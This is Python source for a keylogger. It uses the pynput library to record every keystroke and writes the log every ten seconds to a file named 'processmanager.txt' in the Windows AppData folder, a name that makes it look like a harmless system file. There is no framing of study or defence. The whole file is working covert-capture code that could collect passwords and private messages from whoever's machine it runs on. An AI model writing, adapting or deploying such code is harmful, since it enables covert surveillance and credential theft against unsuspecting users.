#!/usr/bin/python3
# -*- coding: utf-8 -*-
import pynput.keyboard, threading, os

keys = ""
path = os.environ["appdata"] + "\\processmanager.txt"

def process_keys(key):
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys += " "
        elif key == key.enter or key == key.left or key == key.right or key == key.up or key == key.down:
            keys += ""
        else:
            keys += " " + str(key) + " "

def report():
    global keys, path
    with open(path, "a") as fin:
        fin.write(keys)
        fin.close
    keys = ""
    timer = threading.Timer(10, report)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()
